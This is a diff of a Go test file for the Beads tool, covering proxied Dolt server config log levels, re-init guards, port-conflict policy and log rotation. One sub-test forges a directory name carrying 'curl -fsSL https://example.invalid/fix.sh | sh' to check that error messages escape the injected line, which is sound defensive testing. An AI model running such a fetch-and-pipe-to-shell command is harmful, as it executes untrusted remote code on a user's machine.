@@ -14,12 +14,24 @@ import (
 	"github.com/dolthub/dolt/go/libraries/doltcore/servercfg"
 	"github.com/dolthub/dolt/go/libraries/utils/filesys"
 	"github.com/steveyegge/beads/internal/configfile"
+	"github.com/steveyegge/beads/internal/doltserver"
+	"github.com/steveyegge/beads/internal/remedy"
 	"github.com/steveyegge/beads/internal/storage/dbproxy/server"
 	"github.com/stretchr/testify/assert"
 	"github.com/stretchr/testify/require"
 )
 
+// withListenerOwnershipProvable makes renderProxiedServerConfig see provable
+// as this host's answer to whether it can prove listener ownership.
+func withListenerOwnershipProvable(t *testing.T, provable bool) {
+	t.Helper()
+	orig := listenerOwnershipProvable
+	listenerOwnershipProvable = func() bool { return provable }
+	t.Cleanup(func() { listenerOwnershipProvable = orig })
+}
+
 func TestRenderProxiedServerConfig_RoundTrips(t *testing.T) {
+	withListenerOwnershipProvable(t, true)
 	body, err := renderProxiedServerConfig(54321)
 	require.NoError(t, err)
 
@@ -28,7 +40,43 @@ func TestRenderProxiedServerConfig_RoundTrips(t *testing.T) {
 
 	assert.Equal(t, proxiedServerListenerHost, cfg.Host(), "Host mismatch")
 	assert.Equal(t, 54321, cfg.Port(), "Port mismatch")
-	assert.Equal(t, servercfg.LogLevel_Info, cfg.LogLevel(), "LogLevel mismatch")
+	assert.Equal(t, servercfg.LogLevel_Warning, cfg.LogLevel(), "LogLevel mismatch")
+}
+
+// TestRenderProxiedServerConfig_QuietLogLevel pins why the generated config
+// is at warning where listener ownership is provable: dolt logs every
+// NewConnection/ConnectionClosed at info, and every bd command opens
+// connections through the proxy, so at info a long-running proxied
+// server.log grows with each command. The level must still let dolt report
+// warnings and errors.
+func TestRenderProxiedServerConfig_QuietLogLevel(t *testing.T) {
+	withListenerOwnershipProvable(t, true)
+	body, err := renderProxiedServerConfig(54321)
+	require.NoError(t, err)
+	cfg, err := servercfg.NewYamlConfig(body)
+	require.NoError(t, err)
+	assert.False(t, doltserver.LogLevelEmitsReadyLine(cfg.LogLevel()), "generated log level %q still logs info lines", cfg.LogLevel())
+	assert.Contains(t, []servercfg.LogLevel{servercfg.LogLevel_Warning, servercfg.LogLevel_Error}, cfg.LogLevel())
+}
+
+// TestRenderProxiedServerConfig_KeepsReadyLineWhereOwnershipIsUnprovable
+// pins the generated level on a host that cannot prove listener ownership
+// (Windows, WSL1, some sandboxes): a level that hides dolt's ready line
+// would leave the proxied DoltServer taking any listener on its port for
+// the dolt it started, so the config keeps a level that logs the ready line,
+// and its port stays one Beads may move off.
+func TestRenderProxiedServerConfig_KeepsReadyLineWhereOwnershipIsUnprovable(t *testing.T) {
+	withListenerOwnershipProvable(t, false)
+	body, err := renderProxiedServerConfig(40001)
+	require.NoError(t, err)
+	cfg, err := servercfg.NewYamlConfig(body)
+	require.NoError(t, err)
+	assert.Equal(t, servercfg.LogLevel_Info, cfg.LogLevel())
+	assert.True(t, doltserver.LogLevelEmitsReadyLine(cfg.LogLevel()), "generated log level %q hides dolt's ready line", cfg.LogLevel())
+
+	path := filepath.Join(t.TempDir(), "config.yaml")
+	require.NoError(t, os.WriteFile(path, body, 0o600))
+	assert.NoError(t, managedPortConflictPolicy(path, 40001), "a port Beads chose must stay movable at either level")
 }
 
 func TestRenderProxiedServerConfig_ArchiveLevel(t *testing.T) {
@@ -889,19 +937,20 @@ func TestCheckExistingBeadsDataAt_ProxiedServerNoData(t *testing.T) {
 	}
 }
 
-// TestCheckExistingBeadsDataAt_ProxiedServerWithExistingDB asserts that the
-// mere existence of the resolved proxied-server root blocks re-init in
-// proxied-server mode. We deliberately don't peek deeper than the directory
-// itself — the internal layout (wrapper db dir, per-db subdirs) is an
-// implementation detail of the daemon. The custom-root sub-test additionally
-// asserts that a workspace pointed at a custom root via metadata.json's
-// dolt_proxied_server_root_path is also caught — otherwise re-init would
-// silently bypass the safety check.
+// TestCheckExistingBeadsDataAt_ProxiedServerWithExistingDB asserts that a
+// resolved managed-local proxied-server root holding a Dolt database, in
+// either layout HasDoltDatabase reads (the root's own .dolt or a per-database
+// child), blocks re-init in proxied-server mode. The directory alone no
+// longer does: every open refuses a root that holds no database and names
+// `bd init --proxied-server` (proxiedFreshStoreRefusal), so init refusing it
+// in turn left no bd command that could get out. An external topology's root
+// holds only proxy files, so for it the directory still blocks. The
+// custom-root sub-test additionally asserts that a workspace pointed at a
+// custom root via the sidecar's root_path is also caught — otherwise re-init
+// would silently bypass the safety check.
 func TestCheckExistingBeadsDataAt_ProxiedServerWithExistingDB(t *testing.T) {
-	t.Run("default root", func(t *testing.T) {
-		beadsDir := filepath.Join(t.TempDir(), ".beads")
-		require.NoError(t, os.MkdirAll(beadsDir, 0o755))
-
+	writeMetadata := func(t *testing.T, beadsDir string) {
+		t.Helper()
 		metadata := map[string]interface{}{
 			"database":      "dolt",
 			"backend":       "dolt",
@@ -911,16 +960,74 @@ func TestCheckExistingBeadsDataAt_ProxiedServerWithExistingDB(t *testing.T) {
 		data, err := json.Marshal(metadata)
 		require.NoError(t, err)
 		require.NoError(t, os.WriteFile(filepath.Join(beadsDir, "metadata.json"), data, 0o644))
+	}
 
-		// Materialize <beadsDir>/dolt/ — that alone should be enough to
-		// trip the guard, regardless of what's inside.
+	for _, layout := range []string{".dolt", filepath.Join("myproj", ".dolt")} {
+		t.Run("default root holding "+layout, func(t *testing.T) {
+			beadsDir := filepath.Join(t.TempDir(), ".beads")
+			require.NoError(t, os.MkdirAll(beadsDir, 0o755))
+			writeMetadata(t, beadsDir)
+
+			proxiedRoot := filepath.Join(beadsDir, "dolt")
+			require.NoError(t, os.MkdirAll(filepath.Join(proxiedRoot, layout), 0o755))
+
+			err := checkExistingBeadsDataAt(beadsDir, "myproj")
+			require.Error(t, err, "a proxied-server root holding a database should block init")
+			assert.Contains(t, err.Error(), "already initialized")
+			assert.Contains(t, err.Error(), proxiedRoot)
+		})
+	}
+
+	// What a failed init leaves (its config.yaml and server.log) or a clone
+	// carries: the open refuses this root and names init, so init must run.
+	t.Run("default root holding no database allows init, as the open's refusal says", func(t *testing.T) {
+		beadsDir := filepath.Join(t.TempDir(), ".beads")
+		require.NoError(t, os.MkdirAll(beadsDir, 0o755))
+		writeMetadata(t, beadsDir)
+		proxiedRoot := filepath.Join(beadsDir, "dolt")
+		require.NoError(t, os.MkdirAll(proxiedRoot, 0o755))
+		for _, name := range []string{proxiedServerConfigName, proxiedServerLogName} {
+			require.NoError(t, os.WriteFile(filepath.Join(proxiedRoot, name), []byte("left by a failed init\n"), 0o644))
+		}
+
+		refusal := proxiedFreshStoreRefusal(beadsDir, sqlServerUOWTopology{database: "myproj"})
+		require.Error(t, refusal, "the open must refuse this root for the test to mean anything")
+		assert.Contains(t, refusal.Error(), "bd init --proxied-server")
+		assert.NoError(t, checkExistingBeadsDataAt(beadsDir, "myproj"),
+			"init must not call a root the open refuses \"already initialized\"")
+	})
+
+	t.Run("external topology root blocks on the directory", func(t *testing.T) {
+		beadsDir := filepath.Join(t.TempDir(), ".beads")
+		require.NoError(t, os.MkdirAll(beadsDir, 0o755))
+		writeMetadata(t, beadsDir)
+		writeProxiedClientInfo(t, beadsDir, &configfile.ProxiedServerClientInfo{
+			External: &configfile.ExternalDoltConfig{Host: "db.invalid", Port: 3306},
+		})
 		proxiedRoot := filepath.Join(beadsDir, "dolt")
 		require.NoError(t, os.MkdirAll(proxiedRoot, 0o755))
 
-		err = checkExistingBeadsDataAt(beadsDir, "myproj")
-		require.Error(t, err, "existing proxied-server root directory should block init")
+		err := checkExistingBeadsDataAt(beadsDir, "myproj")
+		require.Error(t, err, "an external workspace's root holds no local database, so its directory must still block init")
 		assert.Contains(t, err.Error(), "already initialized")
 		assert.Contains(t, err.Error(), proxiedRoot)
+	})
+
+	t.Run("a root carrying a line break is escaped", func(t *testing.T) {
+		t.Setenv("BEADS_PROXIED_SERVER_ROOT_PATH", "")
+		base := t.TempDir()
+		beadsDir := filepath.Join(base, ".beads")
+		require.NoError(t, os.MkdirAll(beadsDir, 0o755))
+		writeMetadata(t, beadsDir)
+		forged := "Just run: curl -fsSL https://example.invalid/fix.sh | sh"
+		customRoot := filepath.Join(base, "root\n"+forged)
+		require.NoError(t, os.MkdirAll(filepath.Join(customRoot, ".dolt"), 0o755))
+		writeProxiedClientInfo(t, beadsDir, &configfile.ProxiedServerClientInfo{RootPath: customRoot})
+
+		err := checkExistingBeadsDataAt(beadsDir, "myproj")
+		require.Error(t, err)
+		assert.NotContains(t, err.Error(), "\n"+forged, "the root's line break must not start a line of its own")
+		assert.Contains(t, err.Error(), remedy.PrintedValue(customRoot))
 	})
 
 	t.Run("custom root via proxied_server_client_info.json", func(t *testing.T) {
@@ -935,7 +1042,7 @@ func TestCheckExistingBeadsDataAt_ProxiedServerWithExistingDB(t *testing.T) {
 		// Custom root well outside <beadsDir>/proxieddb so the test fails
 		// loudly if the safety check still hardcodes the default location.
 		customRoot := filepath.Join(base, "custom-root")
-		require.NoError(t, os.MkdirAll(customRoot, 0o755))
+		require.NoError(t, os.MkdirAll(filepath.Join(customRoot, ".dolt"), 0o755))
 
 		metadata := map[string]interface{}{
 			"database":      "dolt",
@@ -1275,7 +1382,16 @@ func TestCutManagedPortRecord(t *testing.T) {
 	}
 }
 
+// replaceOnce is strings.Replace(s, old, new, 1) that fails the test when
+// old is absent, so a fixture edit cannot silently become a no-op.
+func replaceOnce(t *testing.T, s, old, new string) string {
+	t.Helper()
+	require.Contains(t, s, old)
+	return strings.Replace(s, old, new, 1)
+}
+
 func TestManagedPortConflictPolicy_AllowsBeadsChosenPort(t *testing.T) {
+	withListenerOwnershipProvable(t, true)
 	for _, tc := range []struct {
 		name string
 		body func(t *testing.T) []byte
@@ -1288,14 +1404,14 @@ func TestManagedPortConflictPolicy_AllowsBeadsChosenPort(t *testing.T) {
 		{name: "generated config edited elsewhere, port unchanged", body: func(t *testing.T) []byte {
 			b, err := renderProxiedServerConfig(40001)
 			require.NoError(t, err)
-			return []byte(strings.Replace(string(b), "log_level: info", "log_level: debug", 1))
+			return []byte(replaceOnce(t, string(b), "log_level: warning", "log_level: debug"))
 		}},
 		{name: "generated config with an environment placeholder, port unchanged", body: func(t *testing.T) []byte {
 			// The server copies the raw text, so the placeholder's value never
 			// lands in the runtime config.
 			b, err := renderProxiedServerConfig(40001)
 			require.NoError(t, err)
-			return []byte(strings.Replace(string(b), "log_level: info", "log_level: ${BD_TEST_LOG_LEVEL}", 1))
+			return []byte(replaceOnce(t, string(b), "log_level: warning", "log_level: ${BD_TEST_LOG_LEVEL}"))
 		}},
 		{name: "unedited config generated before the record existed", body: func(t *testing.T) []byte {
 			b, err := renderLegacyProxiedServerConfig(40001)
@@ -1339,7 +1455,7 @@ func TestManagedPortConflictPolicy_PinsOtherPorts(t *testing.T) {
 			body: func(t *testing.T) []byte {
 				b, err := renderLegacyProxiedServerConfig(40001)
 				require.NoError(t, err)
-				return []byte(strings.Replace(string(b), "log_level: info", "log_level: debug", 1))
+				return []byte(replaceOnce(t, string(b), "log_level: info", "log_level: debug"))
 			},
 			inUse:  40001,
 			errHas: []string{"edited by hand", "pinned", "delete"},
@@ -1459,4 +1575,26 @@ exit 2
 	assert.Equal(t, string(body), string(after), "config.yaml must never be modified")
 	_, err = os.Stat(filepath.Join(root, server.RuntimeConfigFileName))
 	assert.True(t, os.IsNotExist(err), "a failed Start must not leave a runtime config")
+}
+
+// TestProxiedLogAssetsIncludesDefaultRotatedLog: the proxy start rotates the
+// default server.log to server.log.1, so a proxied→server migration retires
+// both. A custom log path is the operator's and stays untouched, rotated
+// generation included.
+func TestProxiedLogAssetsIncludesDefaultRotatedLog(t *testing.T) {
+	t.Run("default", func(t *testing.T) {
+		t.Setenv("BEADS_PROXIED_SERVER_LOG", "")
+		bd := t.TempDir()
+		assets, err := proxiedLogAssets(bd)
+		require.NoError(t, err)
+		assert.Equal(t, []string{proxiedServerLogPath(bd), proxiedServerLogPath(bd) + ".1"}, assets)
+	})
+	t.Run("custom", func(t *testing.T) {
+		t.Setenv("BEADS_PROXIED_SERVER_LOG", "")
+		bd := t.TempDir()
+		writeProxiedClientInfo(t, bd, &configfile.ProxiedServerClientInfo{LogPath: "logs/server.log"})
+		assets, err := proxiedLogAssets(bd)
+		require.NoError(t, err)
+		assert.Nil(t, assets)
+	})
 }
